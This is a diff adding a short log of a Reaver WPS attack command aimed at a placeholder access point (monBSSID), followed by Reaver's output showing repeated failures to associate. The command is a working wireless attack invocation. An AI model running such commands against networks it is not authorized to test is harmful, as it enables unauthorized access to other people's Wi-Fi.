@@ -1,0 +1,15 @@
+reaver -i mon0 -b monBSSID -a -v -L -c 9                                                                                                 
+
+Reaver v1.4 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from monBSSID
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+[!] WARNING: Failed to associate with monBSSID (ESSID: monESSID)
+
